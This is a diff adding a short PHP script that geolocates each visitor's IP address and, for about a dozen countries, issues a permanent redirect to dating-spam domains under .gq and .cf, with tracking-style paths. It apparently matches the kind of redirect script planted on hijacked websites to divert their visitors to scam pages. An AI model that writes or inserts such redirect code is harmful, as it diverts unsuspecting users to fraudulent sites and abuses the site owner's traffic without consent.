@@ -1,0 +1,67 @@
+<?php
+require_once 'IP2Location.php';
+
+$loc = new IP2Location('databases/IP-COUNTRY.BIN', IP2Location::FILE_IO);
+$record = $loc->lookup($_SERVER['REMOTE_ADDR'], IP2Location::ALL);
+
+if($record == 'US') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'CA') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'GB') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'AU') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'NZ') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'DE') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'MX') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.gq/277693/12555');
+	exit;
+}
+if($record == 'ES') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.cf/277693/28427');
+	exit;
+}
+if($record == 'KE') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.cf/277693/31702');
+	exit;
+}
+if($record == 'SK') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.cf/277693/31060');
+	exit;
+}
+if($record == 'TW') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: http://datingme.cf/277693/31190');
+	exit;
+}
+if($record == 'AL') {
+	header('HTTP/1.1 301 Moved Permanently');
+	header('Location: https://www.franktrax.network/');
+	exit;
+}
+?>
